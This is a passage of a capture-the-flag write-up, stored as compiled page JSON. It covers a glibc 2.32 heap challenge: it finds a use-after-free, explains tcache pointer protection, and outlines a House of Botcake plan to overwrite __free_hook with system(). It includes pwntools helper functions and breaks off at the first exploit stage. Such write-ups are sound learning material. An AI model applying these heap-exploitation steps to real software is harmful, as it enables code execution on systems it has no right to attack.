{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var r=Object.create;var l=Object.defineProperty;var d=Object.getOwnPropertyDescriptor;var p=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var t=a=>l(a,\"__esModule\",{value:!0});var u=(a,s)=>()=>(s||a((s={exports:{}}).exports,s),s.exports),N=(a,s)=>{t(a);for(var c in s)l(a,c,{get:s[c],enumerable:!0})},k=(a,s,c)=>{if(s&&typeof s==\"object\"||typeof s==\"function\")for(let e of p(s))!m.call(a,e)&&e!==\"default\"&&l(a,e,{get:()=>s[e],enumerable:!(c=d(s,e))||c.enumerable});return a},g=a=>k(t(l(a!=null?r(h(a)):{},\"default\",a&&a.__esModule&&\"default\"in a?{get:()=>a.default,enumerable:!0}:{value:a,enumerable:!0})),a);var o=u((y,i)=>{i.exports=_jsx_runtime});var w={};N(w,{default:()=>f,frontmatter:()=>x});var n=g(o()),x={title:\"FooBar CTF 2022 \\u2013 Death Note\",date:\"2022-03-08\",draft:!1,authors:[\"Johnathan\"],tags:[\"FooBar CTF 2022\",\"pwn\",\"heap\",\"Shell\",\"Binary Exploit\"],summary:\"A classic heap challenge in FooBar.\",canonical:\"https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/FooBar-CTF-2022/Death-note\"};function b(a={}){let{wrapper:s}=a.components||{};return s?(0,n.jsx)(s,Object.assign({},a,{children:(0,n.jsx)(c,{})})):c();function c(){let e=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",p:\"p\",pre:\"pre\",code:\"code\",img:\"img\",strong:\"strong\",h3:\"h3\",ul:\"ul\",li:\"li\",ol:\"ol\"},a.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)(e.h2,{id:\"foobarctf---death-note\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#foobarctf---death-note\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"FoobarCTF - Death Note\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"You can download challenge file in repo: \",(0,n.jsx)(e.a,{href:\"https://github.com/nhtri2003gmail/CTFNote/blob/master/writeup/2022/FooBar-CTF-2022/Death-note/dist.zip\",children:\"dist.zip\"})]}),`\n`,(0,n.jsx)(e.p,{children:\"There will be several files in zip as below:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`__MACOSX\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`__MACOSX/dist\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`dist\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`dist/dnote\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`dist/ld-2.32.so\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`dist/libc-2.32.so\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Download and extract, then use \",(0,n.jsx)(e.code,{children:\"pwninit\"}),\" to patch file. And now, let\\u2019s start!\"]}),`\n`,(0,n.jsxs)(e.h2,{id:\"1-find-bug\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#1-find-bug\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"1. Find bug\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"First, we will use \",(0,n.jsx)(e.code,{children:\"file\"}),\" to check for basic information:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-bash\",children:(0,n.jsxs)(e.code,{className:\"language-bash code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"$ \",(0,n.jsx)(e.span,{className:\"token function\",children:\"file\"}),` dnote\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"dnote: ELF \",(0,n.jsx)(e.span,{className:\"token number\",children:\"64\"}),\"-bit LSB executable, x86-64, version \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"SYSV\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\", dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"sha1\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\"8980c2c36d828a8b8434c28e64dd0cf4777fd7cf, \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" GNU/Linux \",(0,n.jsx)(e.span,{className:\"token number\",children:\"3.2\"}),`.0, not stripped\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"This is a 64-bit file without being stripped. Next, we will use \",(0,n.jsx)(e.code,{children:\"checksec\"}),\" to check for all defences of file:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-bash\",children:(0,n.jsxs)(e.code,{className:\"language-bash code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`$ checksec dnote\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    Arch:     amd64-64-little\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    RELRO:    Partial RELRO\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    Stack:    No canary found\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    NX:       NX enabled\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    PIE:      No PIE \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"0x400000\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Well, we can see that just \",(0,n.jsx)(e.code,{children:\"NX enabled\"}),\". Finally, we will use ghidra to decompile the challenge file to understand how the program work. There will be several function and we will go through all of them.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"First is the \",(0,n.jsx)(e.code,{children:\"main()\"}),\" function. We can see that there are 3 subfunction: \",(0,n.jsx)(e.code,{children:\"Add Page\"}),\", \",(0,n.jsx)(e.code,{children:\"Show Page\"}),\" and \",(0,n.jsx)(e.code,{children:\"Delete Page\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"With the first option \",(0,n.jsx)(e.code,{children:\"Add Page\"}),\", we can add up to 20 chunk with number from 0 to 20, then malloc() with the size we want because there is no check for the size. After that, we will input data to the chuck with \",(0,n.jsx)(e.code,{children:\"fgets()\"}),\":\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/add_page.png\",alt:\"add_page.png\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"The second option is \",(0,n.jsx)(e.code,{children:\"Show Page\"}),\", which first check if the pointer to chunk is removed or exist in global var \",(0,n.jsx)(e.code,{children:\"note\"}),\". If exist, print data of that chunk out with \",(0,n.jsx)(e.code,{children:\"puts()\"}),\" (\",(0,n.jsx)(e.code,{children:\"puts()\"}),\" will end at null byte).\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/show_page.png\",alt:\"show_page.png\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"And the last option is \",(0,n.jsx)(e.code,{children:\"Delete Page\"}),\" and we don\\u2019t have any option to edit the chunk. The function first check if the pointer to chunk is exist or not. If exist, free() it without removing the pointer to chunk \\u2192 \",(0,n.jsx)(e.strong,{children:\"Use After Free\"})]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/delete_page.png\",alt:\"delete_page.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"And that\\u2019s all bug we can found. Let\\u2019s move on the next part: Brainstorming!\"}),`\n`,(0,n.jsxs)(e.h2,{id:\"2-brainstorming\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#2-brainstorming\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"2. Brainstorming\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"If you\\u2019re not familiar with heap, please read \",(0,n.jsx)(e.a,{href:\"https://guyinatuxedo.github.io/25-heap/index.html\",children:\"here\"}),\" to have a general view about all kinds of chunk.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"First, we will need to leak the main arena address by freeing a large chunk and make it go to large bin (if goes to unsorted bin, it will have null byte at LSB). When we have the libc address, we will need to do a \",(0,n.jsx)(e.strong,{children:\"Tcache attack\"}),\".\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"So let\\u2019s search for available technique to attack lib 2.32 \",(0,n.jsx)(e.a,{href:\"https://github.com/shellphish/how2heap/blob/master/glibc_2.32\",children:\"here\"}),\" and we can see that there is a technique called \",(0,n.jsx)(e.a,{href:\"https://github.com/shellphish/how2heap/blob/master/glibc_2.31/house_of_botcake.c\",children:\"House of botcake\"}),\" will help us double free and overlap chunk. With this, we can overwrite the forward pointer to any address we want.\"]}),`\n`,(0,n.jsxs)(e.p,{children:[\"One thing to notice is that on libc 2.32, the \",(0,n.jsx)(e.a,{href:\"https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L2928\",children:\"tcache\"}),\" changed its act with a simple XOR was added to it:\"]}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`/* Caller must ensure that we know tc_idx is valid and there\\u2019s room\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`   for more chunks.  */\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`static __always_inline void\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`tcache_put (mchunkptr chunk, size_t tc_idx)\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`{\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  /* Mark this chunk as \"in the tcache\" so the test in _int_free will\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`     detect a double free.  */\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  e->key = tcache;\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  tcache->entries[tc_idx] = e;\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  ++(tcache->counts[tc_idx]);\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`}\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`/* Caller must ensure that we know tc_idx is valid and there\\u2019s\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`   available chunks to remove.  */\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`static __always_inline void *\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`tcache_get (size_t tc_idx)\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`{\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  tcache_entry *e = tcache->entries[tc_idx];\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  if (__glibc_unlikely (!aligned_OK (e)))\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`    malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  tcache->entries[tc_idx] = REVEAL_PTR (e->next);\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  --(tcache->counts[tc_idx]);\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  e->key = NULL;\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  return (void *) e;\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`}\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"Two new macros are added to protect the chunk when storing and fetching a chunk which is linked to an old chunk in tcache (which means when we free a chunk and it goes to tcache, the forward pointer will be XOR first and then write to that chunk).\"}),`\n`,(0,n.jsxs)(e.p,{children:[\"At line 12 and 25, there is a function called \",(0,n.jsx)(e.code,{children:\"PROTECT_PTR\"}),\" and \",(0,n.jsx)(e.code,{children:\"REVEAL_PTR\"}),\" which is new in libc 2.32. These functions are defined in the \",(0,n.jsx)(e.a,{href:\"https://elixir.bootlin.com/glibc/glibc-2.32/source/malloc/malloc.c#L341\",children:\"source\"}),\" as follows:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"PROTECT_PTR\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"pos\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"  \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"__typeof\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" pos\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">>\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"REVEAL_PTR\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"PROTECT_PTR\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"&\"}),\"ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"})]})]}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"For example with the image below, \",(0,n.jsx)(e.code,{children:\"P\"}),\" is previous address of old freed chunk, \",(0,n.jsx)(e.code,{children:\"L\"}),\" is current chunk being freed, the protected forward pointer can be calculate as:\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/ex_protect_ptr.png\",alt:\"ex_protect_ptr.png\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We can also create a script to \",(0,n.jsx)(e.code,{children:\"malloc()\"}),\" and then \",(0,n.jsx)(e.code,{children:\"free()\"}),\" to make it go to tcache and we check that. The address for the first chunk is \",(0,n.jsx)(e.code,{children:\"0x55555555b2a0\"}),\" (don\\u2019t include heap metadata):\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/prev_chunk_ex.png\",alt:\"prev_chunk_ex.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"So when it\\u2019s freed, the protected forward pointer for this chunk can be calculate as follows:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`# (<Current chunk address> >> 12) ^ <Previous chunk address> = <protected forward pointer>\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  (     0x55555555b2a0     >> 12) ^             0            = 0x55555555b\n`})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Because this is the first chunk being freed and go to tcache first so \",(0,n.jsx)(e.code,{children:\"<Previous chunk address>\"}),\" will equal to 0. And we will have the address for the second chunk is \",(0,n.jsx)(e.code,{children:\"0x55555555c2e0\"}),\" (don\\u2019t include heap metadata):\"]}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/foobar-ctf-2022/images/current_chunk_ex.png\",alt:\"current_chunk_ex.png\"})}),`\n`,(0,n.jsx)(e.p,{children:\"So the protected forward pointer will equal to:\"}),`\n`,(0,n.jsx)(e.pre,{children:(0,n.jsxs)(e.code,{className:\"code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:`# (<Current chunk address> >> 12) ^ <Previous chunk address> = <protected forward pointer>\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`  (     0x55555555c2e0     >> 12) ^      0x55555555b2a0      = 0x55500000e7fc\n`})]})}),`\n`,(0,n.jsx)(e.p,{children:\"So to overwrite forward pointer, we need the address of previous chunk. That\\u2019s the point we need to notice here.\"}),`\n`,(0,n.jsxs)(e.h3,{id:\"reference-sources\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#reference-sources\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Reference sources\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"https://arttnba3.cn/2020/09/08/CTF-0X00-BUUOJ-PWN/#glibc2-32%E4%B8%8Btcache%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E6%8A%A4\",children:\"https://arttnba3.cn/2020/09/08/CTF-0X00-BUUOJ-PWN/#glibc2-32%E4%B8%8Btcache%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E6%8A%A4\"})}),`\n`,(0,n.jsx)(e.li,{children:(0,n.jsx)(e.a,{href:\"http://blog.nsfocus.net/glibc-234/\",children:\"http://blog.nsfocus.net/glibc-234/\"})}),`\n`]}),`\n`,(0,n.jsxs)(e.h3,{id:\"summary\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#summary\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Summary:\"]}),`\n`,(0,n.jsxs)(e.ol,{children:[`\n`,(0,n.jsx)(e.li,{children:\"Leak main arena address\"}),`\n`,(0,n.jsx)(e.li,{children:\"Leak heap address\"}),`\n`,(0,n.jsx)(e.li,{children:\"Overwrite forward pointer\"}),`\n`,(0,n.jsxs)(e.li,{children:[\"Overwrite \",(0,n.jsx)(e.code,{children:\"__free_hook\"}),\" with system()\"]}),`\n`]}),`\n`,(0,n.jsxs)(e.h2,{id:\"3-exploit\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#3-exploit\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"3. Exploit\"]}),`\n`,(0,n.jsx)(e.p,{children:\"Before we exploit, I wrote these function for a convenient exploitation:\"}),`\n`,(0,n.jsxs)(\"details\",{children:[(0,n.jsx)(\"summary\",{children:\"Code snippet\"}),(0,n.jsx)(\"p\",{children:(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"add\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'>> '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'1'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'no : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'size : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'Name : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"show\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'>> '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'2'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'no : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recvuntil\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\n'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" drop\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"free\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'>> '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'3'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    p\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'no : '\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"idx\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})})})]}),`\n`,(0,n.jsx)(e.p,{children:\"And now let\\u2019s start!\"}),`\n`,(0,n.jsxs)(e.h3,{id:\"stage-1-leak-main-arena-address\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-1-leak-main-arena-address\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Stage 1: Leak main arena 